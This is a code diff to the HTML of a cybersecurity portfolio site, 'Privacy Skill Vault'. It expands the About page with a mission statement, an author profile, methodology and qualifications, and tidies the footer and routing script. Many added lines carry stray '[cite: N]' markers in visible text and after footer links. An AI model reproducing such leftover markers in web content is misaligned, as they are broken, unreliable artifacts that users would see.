@@ -614,47 +986,135 @@ def extract_iocs(log_path):
       <div style="margin-bottom: 2rem;">
         <span style="font-size: 0.75rem; font-weight: 700; color: var(--cyan-glow); text-transform: uppercase;">ABOUT</span>
         <h1 style="font-size: 2rem; margin-top: 0.25rem;">Bridging Theory and Operational Reality</h1>
-        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Documenting real-world threat analysis, cyber fraud administration, and lab-based defensive engineering.</p>
+        <p style="color: var(--text-muted); font-size: 0.875rem; margin-top: 0.5rem;">Documenting real-world threat analysis, cyber fraud administration, and lab-based defensive engineering. Focused on understanding why security controls fail and how detections perform under stress[cite: 1].</p>
       </div>
 
-      <div class="grid-3">
+      <!-- Section 1: Platform Mission -->
+      <div class="section-card" style="margin-bottom: 2rem;">
+        <h2 style="font-size: 1.25rem; margin-bottom: 0.75rem;">1. Platform Mission: Why Privacy Skill Vault Exists</h2>
+        <p style="color: var(--text-muted); font-size: 0.825rem; line-height: 1.6;">
+          A significant amount of cybersecurity content focuses heavily on ideal scenarios, theoretical frameworks, or simplified demonstrations that rarely reflect production environments[cite: 1].
+        </p>
+        <div style="margin-top: 1rem; font-size: 0.825rem; color: var(--text-muted);">
+          <strong style="color: #fff;">Operational analysis in the real world is messy:</strong>
+          <ul style="margin-top: 0.5rem; display: flex; flex-direction: column; gap: 0.35rem; list-style: none;">
+            <li><i class="fa-solid fa-xmark" style="color: #ef4444; margin-right: 0.5rem;"></i> Alerts can be extremely noisy and prone to false positives[cite: 1].</li>
+            <li><i class="fa-solid fa-xmark" style="color: #ef4444; margin-right: 0.5rem;"></i> Logs are often missing, unparsed, or partially configured[cite: 1].</li>
+            <li><i class="fa-solid fa-xmark" style="color: #ef4444; margin-right: 0.5rem;"></i> Security tools and detection rules behave differently depending on host OS, network topology, and logging depth[cite: 1].</li>
+          </ul>
+        </div>
+        <p style="color: var(--text-muted); font-size: 0.825rem; line-height: 1.6; margin-top: 1rem;">
+          <strong>Privacy Skill Vault</strong> was created as a dedicated technical repository to document the operational friction points[cite: 1]. The objective is not simply to showcase successful security outcomes, but to examine root causes during misconfigurations, analyze raw log behavior, and share hands-on methodologies for threat triage and fraud prevention[cite: 1, 2].
+        </p>
+      </div>
+
+      <!-- Section 2 & 3: Author Profile & Core Methodology Grid -->
+      <div class="grid-3" style="margin-bottom: 2rem;">
         <div class="section-card" style="text-align: center;">
           <div style="width: 4rem; height: 4rem; border-radius: 50%; background: var(--bg-surface-alt); border: 1px solid var(--border-color); display: flex; align-items: center; justify-content: center; margin: 0 auto 1rem auto; font-size: 1.5rem; color: var(--text-muted);">
             <i class="fa-solid fa-user-secret"></i>
           </div>
           <h2 style="font-size: 1.125rem;">Security Practitioner</h2>
-          <p style="color: var(--cyan-glow); font-size: 0.75rem; margin-top: 0.25rem;">Cyber Fraud Admin & Security Analyst</p>
-          <div style="border-top: 1px solid var(--border-color); margin-top: 1rem; padding-top: 1rem;">
-            <span style="font-size: 0.65rem; color: var(--text-muted);">Primary Certification:</span>
-            <div style="font-size: 0.875rem; font-weight: 700; color: var(--purple-glow); margin-top: 0.25rem;">eJPT (eLearnSecurity)</div>
+          <p style="color: var(--cyan-glow); font-size: 0.75rem; margin-top: 0.25rem;">Cyber Fraud Administrator & Security Analyst[cite: 1, 2]</p>
+          <div style="display: flex; gap: 0.25rem; justify-content: center; flex-wrap: wrap; margin-top: 0.75rem; font-size: 0.65rem;">
+            <span style="background: rgba(30,41,59,0.8); border: 1px solid var(--border-color); padding: 0.15rem 0.35rem; border-radius: 0.2rem;">SOC Operations</span>
+            <span style="background: rgba(30,41,59,0.8); border: 1px solid var(--border-color); padding: 0.15rem 0.35rem; border-radius: 0.2rem;">Incident Investigation</span>
+            <span style="background: rgba(30,41,59,0.8); border: 1px solid var(--border-color); padding: 0.15rem 0.35rem; border-radius: 0.2rem;">Pentesting</span>
+          </div>
+          <div style="border-top: 1px solid var(--border-color); margin-top: 1rem; padding-top: 0.75rem;">
+            <span style="font-size: 0.65rem; color: var(--text-muted);">Certification:</span>
+            <div style="font-size: 0.825rem; font-weight: 700; color: var(--purple-glow); margin-top: 0.15rem;">eJPT (eLearnSecurity)[cite: 1, 2]</div>
           </div>
         </div>
 
         <div class="section-card" style="grid-column: span 2;">
-          <h2 style="font-size: 1.25rem; margin-bottom: 0.75rem;">Why Privacy Skill Vault Exists</h2>
+          <h2 style="font-size: 1.125rem; margin-bottom: 0.75rem;">2. Author Profile: Behind the Operations</h2>
           <p style="color: var(--text-muted); font-size: 0.825rem; line-height: 1.6;">
-            A significant amount of cybersecurity content focuses heavily on ideal scenarios, theoretical frameworks, or simplified demonstrations that rarely reflect production environments.
+            Privacy Skill Vault is built and maintained by a security practitioner specializing in <strong>Cyber Fraud Administration, Incident Investigation, SOC Operations, and Penetration Testing</strong>[cite: 1, 2].
           </p>
           <p style="color: var(--text-muted); font-size: 0.825rem; line-height: 1.6; margin-top: 0.75rem;">
-            Privacy Skill Vault was created as a dedicated technical repository to document operational friction points—examining root causes during misconfigurations, analyzing raw log behavior, and sharing hands-on methodologies.
+            With practical experience investigating complex threat vectors—such as Account Takeover (ATO), Authorized Push Payment (APP) scams, anti-detect browser usage, and proxy botnets—and holding practical credentials like the <strong>eJPT</strong>, the insights on this site stem directly from hands-on analysis and controlled lab experimentation[cite: 1, 2].
           </p>
+        </div>
+      </div>
+
+      <!-- Section 3: Core Methodology -->
+      <div class="space-y" style="margin-bottom: 2rem;">
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">3. Core Methodology</h2>
+        <div class="grid-3" style="font-size: 0.75rem;">
+          <div class="section-card">
+            <i class="fa-solid fa-bullseye" style="font-size: 1.25rem; color: var(--cyan-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Practical Learning over Theory</h3>
+            <p style="color: var(--text-muted);">Validating security controls, firewall rules, and IDS signatures inside isolated test labs before trusting them in production[cite: 1].</p>
+          </div>
+          <div class="section-card">
+            <i class="fa-solid fa-triangle-exclamation" style="font-size: 1.25rem; color: var(--purple-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Documenting Failure Points</h3>
+            <p style="color: var(--text-muted);">Analyzing why alerts failed to trigger, how evasion techniques bypassed filters, and how misconfigurations occur[cite: 1, 2].</p>
+          </div>
+          <div class="section-card">
+            <i class="fa-solid fa-diagram-project" style="font-size: 1.25rem; color: var(--teal-glow); margin-bottom: 0.5rem;"></i>
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.25rem;">Evidence-Based Triage</h3>
+            <p style="color: var(--text-muted);">Approaching every security alert and fraud anomaly through structured log correlation and entity-relationship analysis[cite: 1, 2].</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 4: Professional Qualifications & Stack Highlights -->
+      <div class="space-y" style="margin-bottom: 2rem;">
+        <h2 style="font-size: 1.125rem; margin-bottom: 1rem;">4. Professional Qualifications & Stack Highlights</h2>
+        <div class="grid-3" style="font-size: 0.75rem;">
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.5rem; color: var(--cyan-glow);">Cyber Fraud Administration</h3>
+            <ul style="color: var(--text-muted); display: flex; flex-direction: column; gap: 0.25rem; list-style: none;">
+              <li>✓ ATO Detection[cite: 2]</li>
+              <li>✓ Device Fingerprinting[cite: 2]</li>
+              <li>✓ Anomaly Analysis[cite: 2]</li>
+            </ul>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.5rem; color: var(--purple-glow);">Defensive Engineering</h3>
+            <ul style="color: var(--text-muted); display: flex; flex-direction: column; gap: 0.25rem; list-style: none;">
+              <li>✓ SIEM Log Correlation[cite: 1]</li>
+              <li>✓ Sysmon & Windows Auditing[cite: 1]</li>
+              <li>✓ Auditd & Linux Telemetry[cite: 1]</li>
+              <li>✓ Suricata IDS & pfSense[cite: 1]</li>
+            </ul>
+          </div>
+          <div class="section-card">
+            <h3 style="font-size: 0.875rem; margin-bottom: 0.5rem; color: var(--teal-glow);">Technical Qualifications</h3>
+            <p style="color: var(--text-muted);"><strong>eJPT</strong> (eLearnSecurity Junior Penetration Tester)</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Section 5: Get in Touch -->
+      <div class="section-card flex-between" style="flex-wrap: wrap; gap: 1rem;">
+        <div>
+          <h2 style="font-size: 1.125rem;">5. Get in Touch / Connect</h2>
+          <p style="font-size: 0.75rem; color: var(--text-muted); margin-top: 0.25rem;">Have questions, feedback, or a technical scenario to discuss? Feel free to explore the repository or connect directly[cite: 1].</p>
+        </div>
+        <div style="display: flex; gap: 0.75rem; flex-wrap: wrap;">
+          <button onclick="navTo('investigations')" class="btn btn-primary">Explore Investigations</button>
+          <a href="https://linkedin.com" target="_blank" class="btn btn-secondary"><i class="fa-brands fa-linkedin"></i> LinkedIn</a>
+          <a href="https://github.com" target="_blank" class="btn btn-secondary"><i class="fa-brands fa-github"></i> GitHub</a>
         </div>
       </div>
     </section>
 
   </main>
 
-  <!-- ================= GLOBAL FOOTER ================= -->
+  <!-- GLOBAL FOOTER -->
   <footer style="border-top: 1px solid var(--border-color); background-color: rgba(2, 5, 14, 0.9); padding: 1.5rem 0; font-size: 0.75rem; color: var(--text-muted);">
     <div class="max-container flex-between" style="flex-wrap: wrap; gap: 1rem;">
-      <div>Copyright © 2026 Privacy Skill Vault. All rights reserved.</div>
+      <div>Copyright © 2026 Privacy Skill Vault. All rights reserved.[cite: 3]</div>
       <div style="display: flex; gap: 1.25rem;">
-        <a href="#home" onclick="navTo('home')">Home</a>
-        <a href="#investigations" onclick="navTo('investigations')">Investigations</a>
-        <a href="#fraud-analysis" onclick="navTo('fraud-analysis')">Fraud Analysis</a>
-        <a href="#lab-setup" onclick="navTo('lab-setup')">Lab Setup</a>
-        <a href="#tools" onclick="navTo('tools')">Tools</a>
-        <a href="#about" onclick="navTo('about')">About</a>
+        <a href="#home" onclick="navTo('home')">Home</a>[cite: 3]
+        <a href="#investigations" onclick="navTo('investigations')">Investigations</a>[cite: 3]
+        <a href="#fraud-analysis" onclick="navTo('fraud-analysis')">Fraud Analysis</a>[cite: 3]
+        <a href="#lab-setup" onclick="navTo('lab-setup')">Lab Setup</a>[cite: 3]
+        <a href="#tools" onclick="navTo('tools')">Tools</a>[cite: 3]
+        <a href="#about" onclick="navTo('about')">About</a>[cite: 3]
       </div>
       <div style="display: flex; gap: 1rem; font-size: 1rem;">
         <a href="#"><i class="fa-brands fa-github"></i></a>
@@ -664,36 +1124,25 @@ def extract_iocs(log_path):
     </div>
   </footer>
 
-  <!-- ================= SPA ROUTING SCRIPT ================= -->
+  <!-- SPA ROUTING SCRIPT -->
   <script>
     function navTo(pageId) {
-      // 1. Hide all page sections
       document.querySelectorAll('.page-section').forEach(el => el.classList.remove('active'));
-      
-      // 2. Display selected target page
       const target = document.getElementById('page-' + pageId);
-      if (target) {
-        target.classList.add('active');
-      }
+      if (target) { target.classList.add('active'); }
 
-      // 3. Update Navbar active styling
       document.querySelectorAll('.nav-links a').forEach(el => el.classList.remove('active-nav'));
       const activeNav = document.getElementById('nav-' + pageId);
-      if (activeNav) {
-        activeNav.classList.add('active-nav');
-      }
+      if (activeNav) { activeNav.classList.add('active-nav'); }
 
-      // 4. Smooth scroll to page top
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // Hash-based URL Routing (Supports direct links like site.com/#tools)
     window.addEventListener('hashchange', () => {
       const hash = window.location.hash.replace('#', '') || 'home';
       navTo(hash);
     });
 
-    // Copy to Clipboard Script for Code Snippets
     function copySnippet(btn) {
       const code = btn.nextElementSibling.innerText;
       navigator.clipboard.writeText(code).then(() => {
@@ -707,7 +1156,6 @@ def extract_iocs(log_path):
       });
     }
 
-    // Initialize default routing on page load
     document.addEventListener('DOMContentLoaded', () => {
       const initialHash = window.location.hash.replace('#', '') || 'home';
       navTo(initialHash);
